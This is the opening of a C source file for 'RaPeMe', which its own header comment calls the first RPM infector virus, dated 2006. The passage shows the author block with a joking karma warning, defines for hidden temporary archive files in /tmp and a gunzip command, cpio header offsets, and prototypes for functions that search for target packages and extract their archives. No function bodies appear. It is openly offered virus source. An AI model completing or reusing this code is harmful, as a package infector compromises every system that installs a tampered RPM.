/*==========
	RaPeMe, the first RPM infector/virus ever 
	and also a powerful chaos magick spell.
	Please use it with caution.

	author : sbudella;
	contact : intestinal.cancer@hotmail.it;
	date : 1 May 2006 - 22 May 2006;
	description : read the README file;
	copyright : read the LICENSE file; 

	notes : "an it harm none, do as thou wilt" 
		If you damage any system using this
		code you will be facing The Law of Return
		soon, that is to say your karma will
		be affected negatively by your acts.
========== */



#include <stdio.h>

#define RPM_BUF_SIZE					2097152
#define TMP_ARCHIVE_NAME_GZ				"/tmp/.tmp.cpio.gz"
#define TMP_ARCHIVE_NAME				"/tmp/.tmp.cpio"
#define GUNZIP_ARCHIVE					"gunzip /tmp/.tmp.cpio.gz 1 2>/dev/null"
#define CPIO_FIRST_FILE_SIZE_OFFSET			54
#define CPIO_FIRST_FILE_NAME_LEN_OFFSET			100	
#define CPIO_FIRST_FILE_NAME_OFFSET			110

FILE *search_target(char *path,int path_size);
unsigned long get_rpm_offset(FILE *rpm);
FILE *get_rpm_archive(FILE *rpm,unsigned long rpm_offset);
unsigned long my_pow(unsigned long a,unsigned long b);
unsigned long get_cpio_header_info(FILE *cpio,int header_offset,int info_size);
char *get_cpio_first_file_name(FILE *cpio,int file_name_len);
